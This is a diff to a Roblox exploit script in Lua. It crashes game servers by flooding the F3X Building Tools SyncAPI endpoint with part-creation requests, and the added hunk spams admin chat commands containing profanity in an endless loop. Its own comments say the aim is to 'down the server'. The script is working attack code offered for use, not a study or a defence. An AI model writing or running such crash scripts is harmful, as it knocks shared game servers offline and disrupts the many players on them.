@@ -1,4 +1,4 @@
--- this is best used when u startertools urself building tools, but does work perfectly fine without it
+-- this is best used when u startergive urself building tools, but does work perfectly fine without it
 
 local function equip()
     for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
@@ -19,6 +19,14 @@ else
     --equip()
 end
 wait(0.5)
+task.delay(5, function() -- remove this entire part if u don't wanna use commands. the f3x crash alone should be powerful enough to down the server on its own
+	for i = 1, 100 do
+		game.Players:Chat("swag                                                                                                    all all all all fuck")
+	end
+	while task.wait() do
+		game.Players:Chat("swag                                                                                                    all all all all fuck")
+	end
+end)
 while true do
 PartTable = {}
 game.Workspace.ChildAdded:Connect(function(v)
@@ -53,5 +61,5 @@ task.spawn(function()
 game:GetService("Players").LocalPlayer.Backpack:WaitForChild("Building Tools"):WaitForChild("SyncAPI"):WaitForChild("ServerEndpoint"):InvokeServer(unpack(args))
  end)
 end
-wait(2.5)
+wait(3.5) -- reduce this wait time a tiny bit if ur not using the swag crash. this is mainly just for stability since my executor keeps crashing
 end
